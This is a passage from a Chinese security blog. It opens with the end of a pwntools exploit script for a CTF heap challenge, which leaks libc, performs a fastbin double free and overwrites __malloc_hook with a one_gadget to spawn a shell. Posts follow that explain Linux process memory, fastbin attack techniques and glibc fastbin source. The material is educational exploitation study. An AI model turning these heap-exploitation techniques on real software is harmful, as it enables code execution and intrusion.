class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;garden:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#----------------leak libc ---------------#</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#将其置入unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;E&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EEEEEEEE&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#-------------- double free ---------------#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#fastbinY(0x70) -&gt; 3 -&gt; 4 -&gt;3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------fastbin attack --------------#</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]+<span class="number">8</span>),<span class="string">&#x27;B&#x27;</span>*<span class="number">23</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/19/fastbin-attack/" data-id="ckq4sk8w40000o4u670aobkww" data-title="Fastbin Attack" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-linux动态内存管理机制" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/" class="article-date">
  <time class="dt-published" datetime="2021-06-19T12:53:35.000Z" itemprop="datePublished">2021-06-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/">Linux动态内存管理机制</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="进程与内存"><a href="#进程与内存" class="headerlink" title="进程与内存"></a>进程与内存</h1><h3 id="1、进程如何使用内存"><a href="#1、进程如何使用内存" class="headerlink" title="1、进程如何使用内存"></a>1、进程如何使用内存</h3><p>毫无疑问，所有进程（执行的程序）都必须占有一定数量的内存，它或是用来存放从磁盘载入的程序代码，或是存取自用户输入的数据等等。不过进程对这些内存的管理方式因为内存用途不一而不尽相同，有些内存是事先静态分配和统一回收的，而有些却是需要动态分配和回收的。</p>
<p>对于任何一个普通进程来讲，它都会涉及到5种不同的数据段。稍有些编程知识的朋友都能想到这几个数据段中包含有“程序代码段”、“程序数据段”、“程序堆栈段等”。不错，这几个数据段都在其中，但除了以上几种数据段之外，进程还另外包含两种数据段。</p>
<p>代码段：代码段是用来存放可执行文件的操作指令，也就是说它是可执行程序在内存中的镜像。代码段需要防止在运行时被非法修改，所以只允许读取操作，而不允许写入操作–它是不可写的。</p>
<p>数据段：数据段用来存放可执行文件中已初始化全局变量，换句话说就是存放程序静态分配的变量和全局变量。</p>
<p>BSS段：BSS段包含了程序汇总未初始化的全局变量，在内存中bss全部置零。</p>
<p>堆段：堆时用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程用malloc等函数分配内存时，新分配的内存就被添加到堆上（堆被扩张）；当利用free等函数释放内存，被释放的内存从堆中被剔除（堆被缩减）</p>
<p>栈：栈是用户存放程序临时创建的局部变量，也就是说我们函数括弧中定义的变量（但不包括static声明的变量,static意味着在数据段中存放变量）。除此之外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈中后进先出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
<h3 id="2、进程如何组织这些区域？"><a href="#2、进程如何组织这些区域？" class="headerlink" title="2、进程如何组织这些区域？"></a>2、进程如何组织这些区域？</h3><p>上述几种内存区域中数据段、BSS和堆通常是被连续存储的–内存位置上是连续的，而代码段和栈往往被独立存放。有趣的是，堆和栈两个区域关系很暧昧，他们一个向下长，一个向上长，但你不必担心他们会碰头，因为他们之间间隔很大。</p>
<p>进入操作系统内核看看，进程对内存具体是如何进行分配和管理的。<br>从用户向内核看，所使用的内存表象形式会依次经历“逻辑地址”–“线性地址”–“物理地址”几种形式。逻辑地址经段机制转化成线性地址；线性地址经过页机制转化为物理地址。（但是我们要知道Linux虽然保留了段机制，但是将所有程序的段地址都定死为0-4G，所以虽然逻辑地址和线性地址是两种不同的地址空间，但在linux中逻辑地址就等于线性地址）沿着这条线索，我们所研究的主要问题也就集中在下面几个问题。<br>1、进程地址空间如何管理？<br>2、进程地址如何映射到物理内存？<br>3、物理内存如何被管理？</p>
<h1 id="进程内存空间"><a href="#进程内存空间" class="headerlink" title="进程内存空间"></a>进程内存空间</h1><p>linux操作系统曹勇虚拟内存管理技术，使得每个进程都有各自互不干涉的进程地址空间。该空间是块大小为4G的线性虚拟空间，用户所看到和接触到的都是该虚拟地址，无法看到实际的物理内存地址。利用这种虚拟地址不但能起到保护操作系统的效果（用户不能直接访问物理内存），而且更重要的是，用户程序可使用比实际物理内存更大的地址空间。</p>
<p>在讨论进程空间细节前，这里先要澄清下面介个问题：</p>
<p>一、4G的进程地址空间被认为的分为两个部分–用户空间与内核空间。用户空间从0到3G（0xC0000000）,内核空间占据3G到4G。用户进程通常情况下只能访问用户空间的虚拟地址，不能访问内核空间虚拟地址。只有用户进程进行系统调用（代表用户进程在内核态执行）等时刻才可以访问到内核空间。</p>
<p>二、用户空间对应进程，每当进程切换，用户空间就会跟着变化；而内核空间是由内核负责映射，它并不会跟着进程改变，是固定的。内核空间地址有着自己对应的页表（init_mm.pgd），用户进程各有不同的页表。</p>
<p>三、每个进程的用户空间都是完全独立、互不相干的。不信的话，你可以把上面的程序同时运行10次，你会看到10个进程占用的线性地址一模一样。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/" data-id="ckq4qur1o0000f0u63bb95tev" data-title="Linux动态内存管理机制" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-堆溢出利用之fastbin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/" class="article-date">
  <time class="dt-published" datetime="2021-06-16T21:54:30.000Z" itemprop="datePublished">2021-06-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/">堆溢出利用之Fastbin</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="前半部分-：基于libc2-23（无tcache）"><a href="#前半部分-：基于libc2-23（无tcache）" class="headerlink" title="前半部分 ：基于libc2.23（无tcache）"></a>前半部分 ：基于libc2.23（无tcache）</h1><h3 id="堆机制-fastbin等"><a href="#堆机制-fastbin等" class="headerlink" title="堆机制(fastbin等)"></a>堆机制(fastbin等)</h3><p>想要了解堆机制利用方法必须要先了解堆的基本机制以及结构</p>
<p>目前主要使用的内存管理库是ptmalloc，而在ptmalloc中，用户请求的空间由名为chunk的数据结构表示</p>
<p>下面就是一个标准的chunk结构<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/1.jpg" alt="1.jpg"><br>该chunk中，prev_size参数为前一chunk的大小，size参数为该chunk的大小，而p参数（pre_insue）为标志位，标志前一个chunk的使用情况。而上述的三个参数组成了chunk的header部分，该部分一般不用被用户直接访问</p>
<p>用户能够访问的空间为mem部分，如果一个chunk正被使用，则data部分为用户存储的内存空间，此时fd、bk指针并无实际意义。如果一个chunk未被使用，则mem部分的fd与bk存储的分别是上一个和下一个未被使用的chunk的地址。而这样一个由未被使用的chunk组成的链表被称为bin。</p>
<p>一般而言，不同大小的free chunk会被分类到不同的bin中，而bin的类型可以被分为fast bin，small bin，large Bin和unsorted bin。其中，fast bin的操作效率较高，为单向链表，其它的都是双向链表。较高的操作效率意味着较低的安全性，所以fastbin机制产生的漏洞也是堆区漏洞的最重要组成部分之一。</p>
<p>诸多的bin链由指针进行管理与保存，数组里头装的就是不同大小的Bin链的头尾结点指针。</p>
<p>fastbinY数组：大小为10，为fastbin的专用数组<br>bins数组：大小为129，其中unsorted bin占1，small bin占2<del>63，large bin占64</del>126</p>
<p>bin数组的结构大致如图<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/1.png" alt="1.png"><br>而我们的fastbinY数组为了追求效率，直接舍弃了对bk指针的管理，是fastbin形成了一个单链表结构（而非一般的双链表），在进行添加删除操作时使用的 是LIFO原则，结构大致如图。<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/2.png" alt="2.png"><br>而fastbin的高效体现在什么地方呢？</p>
<p>默认情况下，对于size_t为4B的平台，小于64B的chunk分配请求；对于size_t为8B的平台，小于64B的chunk分配请求；对于size_t为8B的平台，小于128B的chunk分配请求，程序会根据所需的size首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回chunk。而释放chunk时，也根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p>
<p>32位平台size_t长度为4字节，64位平台的size_t长度可能是4字节，也可能是8字节，64位linux平台size_t长度为8字节</p>
<p>而且为了追求效率,fastbin不仅使用单链表进行维护，由fastbin管理的chunk即使在被释放后chunk的p参数也不会被重置，而且在释放时只会对链表指针头部的chunk进行校验。</p>
<p>以下图为例，在释放掉chunk1之后，结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/3.png" alt="3.png"><br>此时如果用户想再释放一次chunk1，程序会对单链表的头部chunk进行验证，发现用户对同一个chunk连续进行了两次释放操作，此时程序会报错并停止运行。</p>
<p>但是如果我们在释放chunk1之后释放一个chunk2，此时fastbin结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/4.png" alt="4.png"><br>此时头结点就变成了chunk2，此时头结点就变成了chunk2，此时我们就可以对chunk1再一次进行释放操作，这就是fastbin攻击四类型的一种——double free攻击</p>
<h3 id="fastbin的攻击方式"><a href="#fastbin的攻击方式" class="headerlink" title="fastbin的攻击方式"></a>fastbin的攻击方式</h3><h5 id="1、double-free"><a href="#1、double-free" class="headerlink" title="1、double free"></a>1、double free</h5><p>当我们申请了两块chunk，分别命名为chunk1和chunk2，然后一次释放chunk1和chunk2，此时fastbin结构如图<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/5.png" alt="5.png"><br>此时我们利用fastbin的特性，再次释放chunk1，此时会将fastbinY数组的fd指针指向chunk1，把chunk1的fd指针指向chunk2，导致最先进入fastbin的chunk1本应指向0x00的fd指针指向chunk2，此时chunk块结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/6.png" alt="6.png"><br>此时我们如果再次申请一块大小与chunk1大小相同的堆块，我们就能从fastbin中取出chunk1，并对chunk1的fd指针进行修改。注意此时当chunk1的fd被修改后，整个单链表的表尾就指向了修改后的fd，此时先连续malloc两次，把chunk2与chunk1一次取出，在下一次malloc的时候，我们就可以在我们指定的地址申请堆块，间接实现了任意地址写操作。（前提：需要操作目标地址使得size通过fastbin的校验）</p>
<h5 id="2、house-of-spirit"><a href="#2、house-of-spirit" class="headerlink" title="2、house of spirit"></a>2、house of spirit</h5><p>其实感觉house of spirit和double free方法大差不差，只不过更仔细地说明了fake chunk的格式要求，并且修改的不适指定地址的内容，而是指定位置的前后内容。</p>
<p>要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表中，需要绕过一些必要的检测，即</p>
<p>①fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，会单独处理<br>②fake chunk地址需要对齐，malloc_align_mask<br>③fake chunk的size大小需要满足对应的fastbin的需求，同时也得对齐。<br>④fake chunk的next chunk大小不能小于2*SIZE_SZ，同时也不能大于av-&gt;system_mem。<br>⑤fake chunk对应的fastbin链表头部不能是该fake chunk，即不能构成double free的情况。</p>
<p>可以看出，想要使用该技术分配到指定的地址，其实并不需要修改指定指定地址的任何内容，关键是要能够修改指定地址前后的内容使其绕过对应的检测。</p>
<h5 id="3、alloc-to-stack"><a href="#3、alloc-to-stack" class="headerlink" title="3、alloc to stack"></a>3、alloc to stack</h5><p>原理与前二者基本相同，还是戒尺fastbin链表中的chunk的fd指针（除了double free，还可以用堆溢出等技巧），从而把chunk分配到栈上，从而控制栈上的关键数据（如校验值或者关键的返回地址），当然同时需要栈上存在有满足条件的size值。</p>
<h5 id="4、arbitrary-alloc"><a href="#4、arbitrary-alloc" class="headerlink" title="4、arbitrary alloc"></a>4、arbitrary alloc</h5><p>arbitrary alloc其实alloc to stack是完全相同的，唯一的区别是分配的目标不再是栈中。事实上只要满足目标地址存在合法的size域（这个size域是构造的，还是自然存在的都无妨），我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
<p>写到这里，这个fastbin机制的漏洞利用方式已经基本上讲完了（当然是基于libc2.23的）。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/" data-id="ckq116ki700003ou62mn29pum" data-title="堆溢出利用之Fastbin" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-bin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/14/bin/" class="article-date">
  <time class="dt-published" datetime="2021-06-14T15:43:00.000Z" itemprop="datePublished">2021-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/14/bin/">Bin</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>大多数程序经常会申请以及释放比较小的内存块。如果将一些较小的chunk释放之后发现存<br>在与之相邻的空闲chunk并将它们进行合并，那么当下一次再次申请相应大小的chunk时，<br>就需要对chunk进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了<br>合并、分割以及中间检查的过程中。因此,ptmalloc中专门设计了fastbin，对应的变量就是<br>malloc state中的fastbinY</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   Fastbins</span><br><span class="line"></span><br><span class="line">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="line">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="line">    since chunks are never removed from the middles of these lists,</span><br><span class="line">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="line">    are not even processed <span class="keyword">in</span> FIFO order (they use faster LIFO) since</span><br><span class="line">    ordering doesn<span class="string">&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="string">    fastbins are normally used.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="string">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="string">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="string">    other free chunks.</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">typedef struct malloc_chunk *mfastbinptr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">    This is in malloc_state.</span></span><br><span class="line"><span class="string">    /* Fastbins */</span></span><br><span class="line"><span class="string">    mfastbinptr fastbinsY[ NFASTBINS ];</span></span><br><span class="line"><span class="string">*/</span></span><br></pre></td></tr></table></figure>
<p>为了更加高效地利用fastbin，glibc采用单向链表对其中的每一个Bin进行组织，并且每个<br>bin采取LIFO，最近释放的chunk会更早地被分配，所以会增加适用于局部性。也就是说，<br>当用户需要的chunk的大小小于fastbin的最大大小时，ptmalloc会首先判断fastbin中相应<br>的bin中是否有对应大小的空闲块，如果有的话，就去直接从这个bin中获取chunk。如果<br>没有的话，Ptmalloc才会做接下来的一系列操作。</p>
<p>默认情况下（32位系统为例），fastbin中默认支持最大的chunk的数据空间大小为64字节。<br>但是其可以支持的chunk的数据空间最大为80字节。除此之外，fastbin最多可以支持的Bin<br>的个数为10个，从数据空间为8个字节开始一直到80字节（主义这里说的是数据空间大小，<br>也即除去prev_size和size字段部分的大小）定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span></span><br><span class="line"><span class="comment">   they are used as flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//判断分配区是否有 fast bin chunk，1表示没有</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// MORECORE是否返回连续的内存区域。</span></span><br><span class="line"><span class="comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span></span><br><span class="line"><span class="comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == <span class="number">0</span>) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure>
<p>ptmalloc默认情况下会调用set_max_fast(s)将全局变量global_max_fast设置为DEFAULT_<br>MXFAST,也就是设置fast bins 中chunk的最大值。当MAX_FAST_SIZE被设置为0时，系统<br>就不会支持fastbin。</p>
<p><strong>fastbin的索引</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="line">// chunk size=2*size_sz*(2+idx)</span><br><span class="line">// 这里要减2，否则的话，前两个bin没有办法索引到。</span><br><span class="line"><span class="comment">#define fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>
<p>需要特别注意的是，fastbin范围的chunk的inuse始终被置为1。因此它们不会和其它被释放<br>的chunk合并。<br>但是当释放的chunk与该chunk相邻的空闲chunk合并后的大小大于FASTBIN_CONSOLIDATION_<br>THRESHOLD时，内存碎片可能比较多了，我们就需要把fastbins中的chunk都进行合并，<br>以减少内存碎片对系统的影响。</p>
